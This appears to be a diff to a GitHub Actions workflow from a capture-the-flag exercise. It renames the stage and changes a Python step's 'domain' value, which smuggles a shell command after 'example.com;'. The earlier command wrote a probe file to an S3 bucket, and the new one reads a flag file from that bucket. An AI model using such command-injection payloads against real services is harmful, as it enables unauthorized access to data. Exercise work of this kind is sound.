@@ -1,4 +1,4 @@
-name: Stage2-14-Test-Lambda-Log-Write
+name: Stage2-15-Read-Log-Flag
 
 on:
   push:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test log bucket write
+      - name: Test log bucket flag
         run: |
           python3 - <<'PY'
           import os
@@ -44,11 +44,10 @@ jobs:
 
           domain = (
               "example.com; "
-              "printf CTF_PROBE > /tmp/ctf_probe; "
-              "/opt/aws s3api put-object "
+              "/opt/aws s3api get-object "
               "--bucket logad88e2b168aa387e "
-              "--key ctf-probe.txt "
-              "--body /tmp/ctf_probe "
+              "--key flag.txt "
+              "/tmp/log-flag.txt "
               "--region us-east-1 "
               "--endpoint-url https://s3.us-east-1.amazonaws.com "
               ">/tmp/aws_result 2>&1 && sleep 5"
